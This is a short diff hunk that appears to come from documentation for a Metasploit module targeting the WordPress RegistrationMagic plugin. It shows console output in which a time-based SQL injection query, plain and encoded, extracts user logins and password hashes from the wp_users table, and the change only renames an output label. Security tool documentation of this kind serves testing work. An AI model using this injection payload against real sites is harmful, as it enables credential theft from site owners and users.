@@ -67,7 +67,8 @@ resource (registrationmagic.rb)> run
 [*] {SQLi} Executing (select group_concat(GPc) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) GPc from wp_users limit 3) PfXJX)
 [*] {SQLi} Encoded to (select group_concat(GPc) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xc,0)),ifnull(user_pass,repeat(0x24,0))) as binary) GPc from wp_users limit 3) PfXJX)
 [*] {SQLi} Time-based injection: expecting output of length 124
-[+] wp_users
+[+] Dumped table contents:
+wp_users
 ========
 
  user_login  user_pass
